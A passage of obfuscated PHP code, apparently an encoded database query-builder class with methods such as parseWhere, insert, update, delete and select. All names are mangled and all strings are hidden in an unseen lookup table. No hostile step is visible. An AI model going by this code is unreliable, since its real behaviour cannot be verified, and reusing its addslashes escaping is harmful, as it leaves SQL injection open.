$±¥–”ï²[5], $ùãàÍ’¬[21] => $±¥–”ï²[6]); } $‰Å®Ç×÷[$ùãàÍ’¬[1001]] = $ùãàÍ’¬[12]; return $‰Å®Ç×÷; } protected function debug() { $Úª¬û¤‘ =& $_SERVER[¿ğÚ‰±–]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Úª¬û¤‘[1072]; if (think_config($Úª¬û¤‘[1073])) { think_status($Úª¬û¤‘[1074]); think_trace($this->queryStr . $Úª¬û¤‘[1075] . think_status($Úª¬û¤‘[24], $Úª¬û¤‘[1074], 6) . $Úª¬û¤‘[1076], $Úª¬û¤‘[12], $Úª¬û¤‘[1077]); } } protected function parseLock($¶¸õ²€– = false) { $ Í³õÆ† =& $_SERVER[¿ğÚ‰±–]; if (!$¶¸õ²€–) { return $ Í³õÆ†[12]; } if ($ Í³õÆ†[1003] == $this->dbType) { return $ Í³õÆ†[1078]; } return $ Í³õÆ†[1079]; } protected function parseSet($˜Û¡Î­±) { $ªÜÈê’  =& $_SERVER[¿ğÚ‰±–]; foreach ($˜Û¡Î­± as $ŠÁÆË×Ú => $™à¯ùøâ) { if (is_array($™à¯ùøâ) && $ªÜÈê’ [373] == $™à¯ùøâ[0]) { $Àå³ø[] = $this->parseKey($ŠÁÆË×Ú) . $ªÜÈê’ [967] . $™à¯ùøâ[1]; } elseif (is_scalar($™à¯ùøâ) || is_null($™à¯ùøâ)) { $Àå³ø[] = $this->parseKey($ŠÁÆË×Ú) . $ªÜÈê’ [967] . $this->parseValue($™à¯ùøâ); } } return $ªÜÈê’ [1080] . implode($ªÜÈê’ [50], $Àå³ø); } protected function bindParam($¬î±×Ñ, $†ºâà•¹) { $this->bind[$_SERVER[¿ğÚ‰±–][4] . $¬î±×Ñ] = $†ºâà•¹; } protected function parseBind($®­Ä¾¬³) { $®­Ä¾¬³ = array_merge($this->bind, $®­Ä¾¬³); $this->bind = array(); return $®­Ä¾¬³; } function parseKey(&$£¤ı±œÃ, $ıå×¹»õ = true) { if ($ıå×¹»õ) { $£¤ı±œÃ = $this->parseKeyCheck($£¤ı±œÃ); } return $£¤ı±œÃ; } function parseKeyCheck($²Ëö®ä) { $ş«íÉİ» =& $_SERVER[¿ğÚ‰±–]; $²Ëö®ä = trim($²Ëö®ä); if (!preg_match($ş«íÉİ»[1081], $²Ëö®ä)) { think_exception($ş«íÉİ»[1082] . $²Ëö®ä); } return $²Ëö®ä; } protected function parseValue($ŠÍÒ°) { $É§üõò =& $_SERVER[¿ğÚ‰±–]; if (is_string($ŠÍÒ°)) { $ŠÍÒ° = $É§üõò[1042] . $this->escapeString($ŠÍÒ°) . $É§üõò[1042]; } elseif (isset($ŠÍÒ°[0]) && is_string($ŠÍÒ°[0]) && strtolower($ŠÍÒ°[0]) == $É§üõò[373]) { $ŠÍÒ° = $this->escapeString($ŠÍÒ°[1]); } elseif (is_array($ŠÍÒ°)) { $ŠÍÒ° = array_map(array($this, $É§üõò[1043]), $ŠÍÒ°); } elseif (is_bool($ŠÍÒ°)) { $ŠÍÒ° = $ŠÍÒ° ? $É§üõò[91] : $É§üõò[228]; } elseif (is_null($ŠÍÒ°)) { $ŠÍÒ° = $É§üõò[106]; } return $ŠÍÒ°; } protected function parseField($½‹ñ‰Ú) { $ìœÅÄÅŞ =& $_SERVER[¿ğÚ‰±–]; if (is_string($½‹ñ‰Ú) && strpos($½‹ñ‰Ú, $ìœÅÄÅŞ[50])) { $½‹ñ‰Ú = explode($ìœÅÄÅŞ[50], $½‹ñ‰Ú); } if (is_array($½‹ñ‰Ú)) { $Îšåµó = array(); foreach ($½‹ñ‰Ú as $÷‡³¶Ú => $˜‹à‹¬Í) { if (!is_numeric($÷‡³¶Ú)) { $Îšåµó[] = $this->parseKey($÷‡³¶Ú, !1) . $ìœÅÄÅŞ[1083] . $this->parseKey($˜‹à‹¬Í); } else { $Îšåµó[] = $this->parseKey($˜‹à‹¬Í); } } $™º»£Ÿ¨ = implode($ìœÅÄÅŞ[50], $Îšåµó); } elseif (is_string($½‹ñ‰Ú) && !empty($½‹ñ‰Ú)) { $™º»£Ÿ¨ = $½‹ñ‰Ú; } else { $™º»£Ÿ¨ = $ìœÅÄÅŞ[220]; } return $™º»£Ÿ¨; } protected function parseTable($¸ªÃÀæ) { $‚Áğ¹¦‚ =& $_SERVER[¿ğÚ‰±–]; if (is_array($¸ªÃÀæ)) { $˜¹¿æ„’ = array(); foreach ($¸ªÃÀæ as $Ö…Õ¬€ö => $¸¹¯ÊŒ§) { if (!is_numeric($Ö…Õ¬€ö)) { $˜¹¿æ„’[] = $this->parseKey($Ö…Õ¬€ö) . $‚Áğ¹¦‚[53] . $this->parseKey($¸¹¯ÊŒ§); } else { $˜¹¿æ„’[] = $this->parseKey($Ö…Õ¬€ö); } } $¸ªÃÀæ = $˜¹¿æ„’; } elseif (is_string($¸ªÃÀæ)) { if (strstr($¸ªÃÀæ, $‚Áğ¹¦‚[53])) { return $¸ªÃÀæ; } $¸ªÃÀæ = explode($‚Áğ¹¦‚[50], $¸ªÃÀæ); array_walk($¸ªÃÀæ, array($this, $‚Áğ¹¦‚[991])); } return $‚Áğ¹¦‚[985] . trim(implode($‚Áğ¹¦‚[1084], $¸ªÃÀæ), $‚Áğ¹¦‚[461]) . $‚Áğ¹¦‚[985]; } protected function parseWhere($šö¾î†î) { $¤Ùš®îã =& $_SERVER[¿ğÚ‰±–]; $ºöÌìÂ = $¤Ùš®îã[12]; if (is_string($šö¾î†î)) { $ºöÌìÂ = $šö¾î†î; } else { $”³Îª‡ = isset($šö¾î†î[$¤Ùš®îã[1085]]) ? strtoupper($šö¾î†î[$¤Ùš®îã[1085]]) : $¤Ùš®îã[12]; if (in_array($”³Îª‡, array($¤Ùš®îã[1086], $¤Ùš®îã[1087], $¤Ùš®îã[1088]))) { $”³Îª‡ = $¤Ùš®îã[53] . $”³Îª‡ . $¤Ùš®îã[53]; unset($šö¾î†î[$¤Ùš®îã[1085]]); } else { $”³Îª‡ = $¤Ùš®îã[1089]; } foreach ($šö¾î†î as $İ˜Çê¸– => $×…í›½) { $ºöÌìÂ .= $¤Ùš®îã[354]; if (is_numeric($İ˜Çê¸–)) { $İ˜Çê¸– = $¤Ùš®îã[1090]; } if (0 === strpos($İ˜Çê¸–, $¤Ùš®îã[11])) { $ºöÌìÂ .= $this->parseThinkWhere($İ˜Çê¸–, $×…í›½); } else { if (!preg_match($¤Ùš®îã[1091], trim($İ˜Çê¸–))) { think_exception(think_lang($¤Ùš®îã[1092]) . $¤Ùš®îã[4] . $İ˜Çê¸–); } $¥¾»¨óš = is_array($×…í›½) && isset($×…í›½[$¤Ùš®îã[1093]]); $İ˜Çê¸– = trim($İ˜Çê¸–); if (strpos($İ˜Çê¸–, $¤Ùš®îã[214])) { $•Ó×šğ­ = explode($¤Ùš®îã[214], $İ˜Çê¸–); $¯§à£İã = array(); foreach ($•Ó×šğ­ as $şëşÎú© => $Òó±¦¶â) { $—é½‡¨Ê = $¥¾»¨óš ? $×…í›½[$şëşÎú©] : $×…í›½; $¯§à£İã[] = $¤Ùš®îã[337] . $this->parseWhereItem($this->parseKey($Òó±¦¶â), $—é½‡¨Ê) . $¤Ùš®îã[990]; } $ºöÌìÂ .= implode($¤Ùš®îã[1094], $¯§à£İã); } elseif (strpos($İ˜Çê¸–, $¤Ùš®îã[360])) { $•Ó×šğ­ = explode($¤Ùš®îã[360], $İ˜Çê¸–); $¯§à£İã = array(); foreach ($•Ó×šğ­ as $şëşÎú© => $Òó±¦¶â) { $—é½‡¨Ê = $¥¾»¨óš ? $×…í›½[$şëşÎú©] : $×…í›½; $¯§à£İã[] = $¤Ùš®îã[337] . $this->parseWhereItem($this->parseKey($Òó±¦¶â), $—é½‡¨Ê) . $¤Ùš®îã[990]; } $ºöÌìÂ .= implode($¤Ùš®îã[1089], $¯§à£İã); } else { $ºöÌìÂ .= $this->parseWhereItem($this->parseKey($İ˜Çê¸–), $×…í›½); } } $ºöÌìÂ .= $¤Ùš®îã[355] . $”³Îª‡; } $ºöÌìÂ = substr($ºöÌìÂ, 0, -strlen($”³Îª‡)); } return empty($ºöÌìÂ) ? $¤Ùš®îã[12] : $¤Ùš®îã[1095] . $ºöÌìÂ; } protected function parseWhereItem($Æ†’·ºÛ, $¹õû«í) { $¬šçàÆŠ =& $_SERVER[¿ğÚ‰±–]; $Ñ‹ÍÑ™§ = $¬šçàÆŠ[12]; if (is_array($¹õû«í)) { if (is_string($¹õû«í[0])) { $š‡Ø›ÓÆ = strtolower($¹õû«í[0]); if (in_array($¹õû«í[0], array($¬šçàÆŠ[967], $¬šçàÆŠ[1096], $¬šçàÆŠ[1097], $¬šçàÆŠ[1098], $¬šçàÆŠ[1099], $¬šçàÆŠ[1100]))) { $Ñ‹ÍÑ™§ .= $Æ†’·ºÛ . $¬šçàÆŠ[53] . $¹õû«í[0] . $¬šçàÆŠ[53] . $this->parseValue($¹õû«í[1]); } elseif (preg_match($¬šçàÆŠ[1101], $¹õû«í[0])) { $Ñ‹ÍÑ™§ .= $Æ†’·ºÛ . $¬šçàÆŠ[53] . $this->exp[$š‡Ø›ÓÆ] . $¬šçàÆŠ[53] . $this->parseValue($¹õû«í[1]); } elseif (preg_match($¬šçàÆŠ[1102], $¹õû«í[0])) { if (is_array($¹õû«í[1])) { $ƒïÖ§Éü = isset($¹õû«í[2]) ? strtoupper($¹õû«í[2]) : $¬šçàÆŠ[1087]; if (in_array($ƒïÖ§Éü, array($¬šçàÆŠ[1086], $¬šçàÆŠ[1087], $¬šçàÆŠ[1088]))) { $ë„ĞÇÑ = array(); foreach ($¹õû«í[1] as $÷äÇ’÷“) { $ë„ĞÇÑ[] = $Æ†’·ºÛ . $¬šçàÆŠ[53] . $this->exp[$š‡Ø›ÓÆ] . $¬šçàÆŠ[53] . $this->parseValue($÷äÇ’÷“); } $Ñ‹ÍÑ™§ .= $¬šçàÆŠ[337] . implode($¬šçàÆŠ[53] . $ƒïÖ§Éü . $¬šçàÆŠ[53], $ë„ĞÇÑ) . $¬šçàÆŠ[990]; } } else { $Ñ‹ÍÑ™§ .= $Æ†’·ºÛ . $¬šçàÆŠ[53] . $this->exp[$š‡Ø›ÓÆ] . $¬šçàÆŠ[53] . $this->parseValue($¹õû«í[1]); } } elseif ($¬šçàÆŠ[373] == $š‡Ø›ÓÆ) { $Ñ‹ÍÑ™§ .= $¬šçàÆŠ[988] . $Æ†’·ºÛ . $¬šçàÆŠ[53] . $¹õû«í[1] . $¬šçàÆŠ[1103]; } elseif (preg_match($¬šçàÆŠ[1104], $¹õû«í[0])) { $Ñ‹ÍÑ™§ .= $¹õû«í[0]; } elseif (preg_match($¬šçàÆŠ[1105], $¹õû«í[0])) { if (isset($¹õû«í[2]) && $¬šçàÆŠ[373] == $¹õû«í[2]) { $Ñ‹ÍÑ™§ .= $Æ†’·ºÛ . $¬šçàÆŠ[53] . $this->exp[$š‡Ø›ÓÆ] . $¬šçàÆŠ[53] . $¹õû«í[1]; } else { if (is_string($¹õû«í[1])) { $¹õû«í[1] = explode($¬šçàÆŠ[50], $¹õû«í[1]); } $ÀÏ±ÑŸ¶ = implode($¬šçàÆŠ[50], $this->parseValue($¹õû«í[1])); $Ñ‹ÍÑ™§ .= $Æ†’·ºÛ . $¬šçàÆŠ[53] . $this->exp[$š‡Ø›ÓÆ] . $¬šçàÆŠ[988] . $ÀÏ±ÑŸ¶ . $¬šçàÆŠ[990]; } } elseif (preg_match($¬šçàÆŠ[1106], $¹õû«í[0])) { $Œ–é’ÅŸ = is_string($¹õû«í[1]) ? explode($¬šçàÆŠ[50], $¹õû«í[1]) : $¹õû«í[1]; $Ñ‹ÍÑ™§ .= $¬šçàÆŠ[988] . $Æ†’·ºÛ . $¬šçàÆŠ[53] . $this->exp[$š‡Ø›ÓÆ] . $¬šçàÆŠ[53] . $this->parseValue($Œ–é’ÅŸ[0]) . $¬šçàÆŠ[1089] . $this->parseValue($Œ–é’ÅŸ[1]) . $¬šçàÆŠ[355]; } else { think_exception(think_lang($¬šçàÆŠ[1092]) . $¬šçàÆŠ[4] . $¹õû«í[0]); } } else { $–Ú…©ç¬ = count($¹õû«í); $ÙÇ¥­Ê¦ = $¬šçàÆŠ[12]; if (is_string($¹õû«í[$–Ú…©ç¬ - 1])) { $ÙÇ¥­Ê¦ = isset($¹õû«í[$–Ú…©ç¬ - 1]) ? strtoupper($¹õû«í[$–Ú…©ç¬ - 1]) : $¬šçàÆŠ[12]; if (in_array($ÙÇ¥­Ê¦, array($¬šçàÆŠ[1086], $¬šçàÆŠ[1087], $¬šçàÆŠ[1088]))) { $–Ú…©ç¬ = $–Ú…©ç¬ - 1; } } else { $ÙÇ¥­Ê¦ = $¬šçàÆŠ[1086]; } for ($œñìÂ–½ = 0; $œñìÂ–½ < $–Ú…©ç¬; $œñìÂ–½++) { $Œ–é’ÅŸ = is_array($¹õû«í[$œñìÂ–½]) ? $¹õû«í[$œñìÂ–½][1] : $¹õû«í[$œñìÂ–½]; if ($¬šçàÆŠ[373] == strtolower($¹õû«í[$œñìÂ–½][0])) { $Ñ‹ÍÑ™§ .= $¬šçàÆŠ[337] . $Æ†’·ºÛ . $¬šçàÆŠ[53] . $Œ–é’ÅŸ . $¬šçàÆŠ[1103] . $ÙÇ¥­Ê¦ . $¬šçàÆŠ[53]; } else { $İü™ºÅ× = is_array($¹õû«í[$œñìÂ–½]) ? $this->exp[strtolower($¹õû«í[$œñìÂ–½][0])] : $¬šçàÆŠ[967]; if (!$İü™ºÅ× && is_array($¹õû«í[$œñìÂ–½]) && in_array($¹õû«í[$œñìÂ–½][0], array($¬šçàÆŠ[967], $¬šçàÆŠ[1096], $¬šçàÆŠ[1097], $¬šçàÆŠ[1098], $¬šçàÆŠ[1099], $¬šçàÆŠ[1100]))) { $İü™ºÅ× = $¹õû«í[$œñìÂ–½][0]; } $Ñ‹ÍÑ™§ .= $¬šçàÆŠ[337] . $Æ†’·ºÛ . $¬šçàÆŠ[53] . $İü™ºÅ× . $¬šçàÆŠ[53] . $this->parseValue($Œ–é’ÅŸ) . $¬šçàÆŠ[1103] . $ÙÇ¥­Ê¦ . $¬šçàÆŠ[53]; } } $Ñ‹ÍÑ™§ = substr($Ñ‹ÍÑ™§, 0, -4); } } else { $Ñ‹ÍÑ™§ .= $Æ†’·ºÛ . $¬šçàÆŠ[1107] . $this->parseValue($¹õû«í); } return $Ñ‹ÍÑ™§; } protected function parseThinkWhere($˜ª®ğÁñ, $„Õ‹Èê·) { $€¨óˆ· =& $_SERVER[¿ğÚ‰±–]; $ıĞû“Ø™ = $€¨óˆ·[12]; switch ($˜ª®ğÁñ) { case $€¨óˆ·[428]: $ıĞû“Ø™ = $„Õ‹Èê·; break; case $€¨óˆ·[1090]: $ıĞû“Ø™ = is_string($„Õ‹Èê·) ? $„Õ‹Èê· : substr($this->parseWhere($„Õ‹Èê·), 6); break; case $€¨óˆ·[1108]: parse_str($„Õ‹Èê·, $”Ñıâ”); if (isset($”Ñıâ”[$€¨óˆ·[1085]])) { $€¦ë•“ = $€¨óˆ·[53] . strtoupper($”Ñıâ”[$€¨óˆ·[1085]]) . $€¨óˆ·[53]; unset($”Ñıâ”[$€¨óˆ·[1085]]); } else { $€¦ë•“ = $€¨óˆ·[1089]; } $¹ğœõµœ = array(); foreach ($”Ñıâ” as $Â× ¾¤ => $Ğ¸õ”¹Ø) { $¹ğœõµœ[] = $this->parseKey($Â× ¾¤) . $€¨óˆ·[1107] . $this->parseValue($Ğ¸õ”¹Ø); } $ıĞû“Ø™ = implode($€¦ë•“, $¹ğœõµœ); break; } return $ıĞû“Ø™; } protected function parseLimit($•é½œÔ‰) { $´àõ©ì¥ =& $_SERVER[¿ğÚ‰±–]; return !empty($•é½œÔ‰) ? $´àõ©ì¥[51] . $•é½œÔ‰ . $´àõ©ì¥[53] : $´àõ©ì¥[12]; } protected function parseJoin($»Ç¡êå÷) { $èÔ«³¹Í =& $_SERVER[¿ğÚ‰±–]; $Áïçªàò = $èÔ«³¹Í[12]; if (!empty($»Ç¡êå÷)) { if (is_array($»Ç¡êå÷)) { foreach ($»Ç¡êå÷ as $İ½’Í»· => $Õ×ö¦õì) { if (!1 !== stripos($Õ×ö¦õì, $èÔ«³¹Í[1109])) { $Áïçªàò .= $èÔ«³¹Í[53] . $Õ×ö¦õì; } else { $Áïçªàò .= $èÔ«³¹Í[1110] . $Õ×ö¦õì; } } } else { $Áïçªàò .= $èÔ«³¹Í[1110] . $»Ç¡êå÷; } } $Áïçªàò = preg_replace($èÔ«³¹Í[1111], think_config($èÔ«³¹Í[1015]) . $èÔ«³¹Í[1112], $Áïçªàò); return $Áïçªàò; } protected function parseOrder($¬¾»œõù) { $Î§ö³Ñ =& $_SERVER[¿ğÚ‰±–]; if (is_array($¬¾»œõù)) { $é©Îš‡Ş = array(); foreach ($¬¾»œõù as $•©»ë«Ø => $›ıíÕëÒ) { if (is_numeric($•©»ë«Ø)) { $é©Îš‡Ş[] = $this->parseKey($›ıíÕëÒ); } else { $›ıíÕëÒ = in_array(strtoupper(trim($›ıíÕëÒ)), array($Î§ö³Ñ[1113], $Î§ö³Ñ[1114])) ? $Î§ö³Ñ[53] . $›ıíÕëÒ : $Î§ö³Ñ[12]; if (preg_match($Î§ö³Ñ[1115], $•©»ë«Ø)) { $é©Îš‡Ş[] = $this->parseKey($•©»ë«Ø) . $›ıíÕëÒ; } else { think_exception($Î§ö³Ñ[1116] . $•©»ë«Ø); } } } $¬¾»œõù = implode($Î§ö³Ñ[50], $é©Îš‡Ş); } return !empty($¬¾»œõù) ? $Î§ö³Ñ[1117] . $¬¾»œõù : $Î§ö³Ñ[12]; } protected function parseGroup($êèË“ßş) { $ŒËñ‡İ‰ =& $_SERVER[¿ğÚ‰±–]; return !empty($êèË“ßş) ? $ŒËñ‡İ‰[1118] . $êèË“ßş : $ŒËñ‡İ‰[12]; } protected function parseHaving($ÜğıÜ„–) { $¬Øøœöé =& $_SERVER[¿ğÚ‰±–]; return !empty($ÜğıÜ„–) ? $¬Øøœöé[1119] . $ÜğıÜ„– : $¬Øøœöé[12]; } protected function parseComment($ñıã–Õº) { $Ã ûéù =& $_SERVER[¿ğÚ‰±–]; return !empty($ñıã–Õº) ? $Ã ûéù[1120] . $ñıã–Õº . $Ã ûéù[1121] : $Ã ûéù[12]; } protected function parseDistinct($„ø··¶œ) { $Ğ¸ä—ôü =& $_SERVER[¿ğÚ‰±–]; return !empty($„ø··¶œ) ? $Ğ¸ä—ôü[1122] : $Ğ¸ä—ôü[12]; } protected function parseUnion($Èà¡¬Ğ) { $²¸ĞÙÜ =& $_SERVER[¿ğÚ‰±–]; if (empty($Èà¡¬Ğ)) { return $²¸ĞÙÜ[12]; } if (isset($Èà¡¬Ğ[$²¸ĞÙÜ[424]])) { $üÌ§…¦æ = $²¸ĞÙÜ[1123]; unset($Èà¡¬Ğ[$²¸ĞÙÜ[424]]); } else { $üÌ§…¦æ = $²¸ĞÙÜ[1124]; } foreach ($Èà¡¬Ğ as $ûŒˆ‘­Â) { $ì„Ø€Ğƒ[] = $üÌ§…¦æ . (is_array($ûŒˆ‘­Â) ? $this->buildSelectSql($ûŒˆ‘­Â) : $ûŒˆ‘­Â); } return implode($²¸ĞÙÜ[53], $ì„Ø€Ğƒ); } public function insert($¤ÇÍÌæÁ, $÷ÇúŸ = array(), $Ÿ¥˜ÙìÒ = false) { $ûæÌûÃ¨ =& $_SERVER[¿ğÚ‰±–]; $ãÂºóËÆ = $…¨Êƒ¤¢ = array(); $this->model = $÷ÇúŸ[$ûæÌûÃ¨[358]]; foreach ($¤ÇÍÌæÁ as $¿áëÔØı => $¼Ç¾¢ƒÙ) { if (is_array($¼Ç¾¢ƒÙ) && $ûæÌûÃ¨[373] == $¼Ç¾¢ƒÙ[0]) { $…¨Êƒ¤¢[] = $this->parseKey($¿áëÔØı); $ãÂºóËÆ[] = $¼Ç¾¢ƒÙ[1]; } elseif (is_scalar($¼Ç¾¢ƒÙ) || is_null($¼Ç¾¢ƒÙ)) { $…¨Êƒ¤¢[] = $this->parseKey($¿áëÔØı); $ãÂºóËÆ[] = $this->parseValue($¼Ç¾¢ƒÙ); } } $”‰¿¤ŸÃ = ($Ÿ¥˜ÙìÒ ? $ûæÌûÃ¨[992] : $ûæÌûÃ¨[993]) . $ûæÌûÃ¨[994] . $this->parseTable($÷ÇúŸ[$ûæÌûÃ¨[356]]) . $ûæÌûÃ¨[988] . implode($ûæÌûÃ¨[50], $…¨Êƒ¤¢) . $ûæÌûÃ¨[989] . implode($ûæÌûÃ¨[50], $ãÂºóËÆ) . $ûæÌûÃ¨[990]; $”‰¿¤ŸÃ .= $this->parseLock(isset($÷ÇúŸ[$ûæÌûÃ¨[921]]) ? $÷ÇúŸ[$ûæÌûÃ¨[921]] : !1); $”‰¿¤ŸÃ .= $this->parseComment(!empty($÷ÇúŸ[$ûæÌûÃ¨[430]]) ? $÷ÇúŸ[$ûæÌûÃ¨[430]] : $ûæÌûÃ¨[12]); return $this->execute($”‰¿¤ŸÃ, $this->parseBind(!empty($÷ÇúŸ[$ûæÌûÃ¨[361]]) ? $÷ÇúŸ[$ûæÌûÃ¨[361]] : array())); } public function selectInsert($õâëîƒ, $ï²ŠŠÔ, $àşãÉ¹Í = array()) { $ÖåÍâÛ… =& $_SERVER[¿ğÚ‰±–]; $this->model = $àşãÉ¹Í[$ÖåÍâÛ…[358]]; if (is_string($õâëîƒ)) { $õâëîƒ = explode($ÖåÍâÛ…[50], $õâëîƒ); } array_walk($õâëîƒ, array($this, $ÖåÍâÛ…[991])); $ºŒ±¢ü• = $ÖåÍâÛ…[1125] . $this->parseTable($ï²ŠŠÔ) . $ÖåÍâÛ…[988] . implode($ÖåÍâÛ…[50], $õâëîƒ) . $ÖåÍâÛ…[1103]; $ºŒ±¢ü• .= $this->buildSelectSql($àşãÉ¹Í); return $this->execute($ºŒ±¢ü•, $this->parseBind(!empty($àşãÉ¹Í[$ÖåÍâÛ…[361]]) ? $àşãÉ¹Í[$ÖåÍâÛ…[361]] : array())); } public function update($Ù‰¡»Í, $ÏÓó•) { $ËÜ›Ğóï =& $_SERVER[¿ğÚ‰±–]; $this->model = $ÏÓó•[$ËÜ›Ğóï[358]]; $ØƒÀÛ¯ò = $ËÜ›Ğóï[1126] . $this->parseTable($ÏÓó•[$ËÜ›Ğóï[356]]) . $this->parseSet($Ù‰¡»Í) . $this->parseWhere(!empty($ÏÓó•[$ËÜ›Ğóï[352]]) ? $ÏÓó•[$ËÜ›Ğóï[352]] : $ËÜ›Ğóï[12]) . $this->parseOrder(!empty($ÏÓó•[$ËÜ›Ğóï[441]]) ? $ÏÓó•[$ËÜ›Ğóï[441]] : $ËÜ›Ğóï[12]) . $this->parseLimit(!empty($ÏÓó•[$ËÜ›Ğóï[368]]) ? $ÏÓó•[$ËÜ›Ğóï[368]] : $ËÜ›Ğóï[12]) . $this->parseLock(isset($ÏÓó•[$ËÜ›Ğóï[921]]) ? $ÏÓó•[$ËÜ›Ğóï[921]] : !1) . $this->parseComment(!empty($ÏÓó•[$ËÜ›Ğóï[430]]) ? $ÏÓó•[$ËÜ›Ğóï[430]] : $ËÜ›Ğóï[12]); return $this->execute($ØƒÀÛ¯ò, $this->parseBind(!empty($ÏÓó•[$ËÜ›Ğóï[361]]) ? $ÏÓó•[$ËÜ›Ğóï[361]] : array())); } public function delete($èŒîˆË = array()) { $É¹ôåà• =& $_SERVER[¿ğÚ‰±–]; $this->model = $èŒîˆË[$É¹ôåà•[358]]; $·§Ûƒú = $É¹ôåà•[1127] . $this->parseTable($èŒîˆË[$É¹ôåà•[356]]) . $this->parseWhere(!empty($èŒîˆË[$É¹ôåà•[352]]) ? $èŒîˆË[$É¹ôåà•[352]] : $É¹ôåà•[12]) . $this->parseOrder(!empty($èŒîˆË[$É¹ôåà•[441]]) ? $èŒîˆË[$É¹ôåà•[441]] : $É¹ôåà•[12]) . $this->parseLimit(!empty($èŒîˆË[$É¹ôåà•[368]]) ? $èŒîˆË[$É¹ôåà•[368]] : $É¹ôåà•[12]) . $this->parseLock(isset($èŒîˆË[$É¹ôåà•[921]]) ? $èŒîˆË[$É¹ôåà•[921]] : !1) . $this->parseComment(!empty($èŒîˆË[$É¹ôåà•[430]]) ? $èŒîˆË[$É¹ôåà•[430]] : $É¹ôåà•[12]); return $this->execute($·§Ûƒú, $this->parseBind(!empty($èŒîˆË[$É¹ôåà•[361]]) ? $èŒîˆË[$É¹ôåà•[361]] : array())); } public function select($‘‡¡‡¯Ê = array()) { $è°µœ™ =& $_SERVER[¿ğÚ‰±–]; $this->model = $‘‡¡‡¯Ê[$è°µœ™[358]]; $ŒÃ©ÕÖ = $this->buildSelectSql($‘‡¡‡¯Ê); $Ÿó™Ë¯Ù = isset($‘‡¡‡¯Ê[$è°µœ™[425]]) ? $‘‡¡‡¯Ê[$è°µœ™[425]] : !1; if ($Ÿó™Ë¯Ù) { $ïàš­ÜÒ = is_string($Ÿó™Ë¯Ù[$è°µœ™[97]]) ? $Ÿó™Ë¯Ù[$è°µœ™[97]] : $è°µœ™[1128] . md5($ŒÃ©ÕÖ); $Ö¦¯…Ù = think_cache($ïàš­ÜÒ, $è°µœ™[12], $Ÿó™Ë¯Ù); if (!1 !== $Ö¦¯…Ù) { return $Ö¦¯…Ù; } } $¶³Ù¨ë‚ = $this->query($ŒÃ©ÕÖ, $this->parseBind(!empty($‘‡¡‡¯Ê[$è°µœ™[361]]) ? $‘‡¡‡¯Ê[$è°µœ™[361]] : array())); if ($Ÿó™Ë¯Ù && !1 !== $¶³Ù¨ë‚) { think_cache($ïàš­ÜÒ, $¶³Ù¨ë‚, $Ÿó™Ë¯Ù); } return $¶³Ù¨ë‚; } public function buildSelectSql($õ£ñª˜á = array()) { $Âü¼ƒ™ =& $_SERVER[¿ğÚ‰±–]; if (isset($õ£ñª˜á[$Âü¼ƒ™[429]])) { if (strpos($õ£ñª˜á[$Âü¼ƒ™[429]], $Âü¼ƒ™[50])) { list($ÇÒ¼×Úâ, $¢¡ø‰ËÕ) = explode($Âü¼ƒ™[50], $õ£ñª˜á[$Âü¼ƒ™[429]]); } else { $ÇÒ¼×Úâ = $õ£ñª˜á[$Âü¼ƒ™[429]]; } $ÇÒ¼×Úâ = $ÇÒ¼×Úâ ? $ÇÒ¼×Úâ : 1; $¢¡ø‰ËÕ = isset($¢¡ø‰ËÕ) ? $¢¡ø‰ËÕ : (is_numeric($õ£ñª˜á[$Âü¼ƒ™[368]]) ? $õ£ñª˜á[$Âü¼ƒ™[368]] : 20); $ñ«İÀÎî = $¢¡ø‰ËÕ * ((int) $ÇÒ¼×Úâ - 1); $õ£ñª˜á[$Âü¼ƒ™[368]] = $ñ«İÀÎî . $Âü¼ƒ™[50] . $¢¡ø‰ËÕ; } if (think_config($Âü¼ƒ™[1129])) { $„‚ÃÈÓ = $Âü¼ƒ™[1130] . md5(serialize($õ£ñª˜á)); $»Ï¼œÖ = think_cache($„‚ÃÈÓ); if ($»Ï¼œÖ) { return $»Ï¼œÖ; } } $Îğ®³— = $this->parseSql($this->selectSql, $õ£ñª˜á); $Îğ®³— .= $this->parseLock(isset($õ£ñª˜á[$Âü¼ƒ™[921]]) ? $õ£ñª˜á[$Âü¼ƒ™[921]] : !1); if (isset($„‚ÃÈÓ)) { think_cache($„‚ÃÈÓ, $Îğ®³—); } return $Îğ®³—; } public function parseSql($£éÓå¾Ú, $ŞıÛ¶òî = array()) { $´‘À©û =& $_SERVER[¿ğÚ‰±–]; $£éÓå¾Ú = str_replace(array($´‘À©û[1131], $´‘À©û[1132], $´‘À©û[1133], $´‘À©û[1134], $´‘À©û[1135], $´‘À©û[1136], $´‘À©û[1137], $´‘À©û[1138], $´‘À©û[1139], $´‘À©û[1140], $´‘À©û[1141]), array($this->parseTable("{$ŞıÛ¶òî[$´‘À©û[356]]}"), $this->parseDistinct(isset($ŞıÛ¶òî[$´‘À©û[1142]]) ? $ŞıÛ¶òî[$´‘À©û[1142]] : !1), $this->parseField(!empty($ŞıÛ¶òî[$´‘À©û[350]]) ? $ŞıÛ¶òî[$´‘À©û[350]] : $´‘À©û[220]), $this->parseJoin(!empty($ŞıÛ¶òî[$´‘À©û[359]]) ? $ŞıÛ¶òî[$´‘À©û[359]] : $´‘À©û[12]), $this->parseWhere(!empty($ŞıÛ¶òî[$´‘À©û[352]]) ? $ŞıÛ¶òî[$´‘À©û[352]] : $´‘À©û[12]), $this->parseGroup(!empty($ŞıÛ¶òî[$´‘À©û[578]]) ? $ŞıÛ¶òî[$´‘À©û[578]] : $´‘À©û[12]), $this->parseHaving(!empty($ŞıÛ¶òî[$´‘À©û[1143]]) ? $ŞıÛ¶òî[$´‘À©û[1143]] : $´‘À©û[12]), $this->parseOrder(!empty($ŞıÛ¶òî[$´‘À©û[441]]) ? $ŞıÛ¶òî[$´‘À©û[441]] : $´‘À©û[12]), $this->parseLimit(!empty($ŞıÛ¶òî[$´‘À©û[368]]) ? $ŞıÛ¶òî[$´‘À©û[368]] : $´‘À©û[12]), $this->parseUnion(!empty($ŞıÛ¶òî[$´‘À©û[423]]) ? $ŞıÛ¶òî[$´‘À©û[423]] : $´‘À©û[12]), $this->parseComment(!empty($ŞıÛ¶òî[$´‘À©û[430]]) ? $ŞıÛ¶òî[$´‘À©û[430]] : $´‘À©û[12])), $£éÓå¾Ú); return $£éÓå¾Ú; } public function getLastSql($¡¶¥¥é¨ = '') { return $¡¶¥¥é¨ ? $this->modelSql[$¡¶¥¥é¨] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($àÙı†Ğè) { return addslashes($àÙı†Ğè); } public function 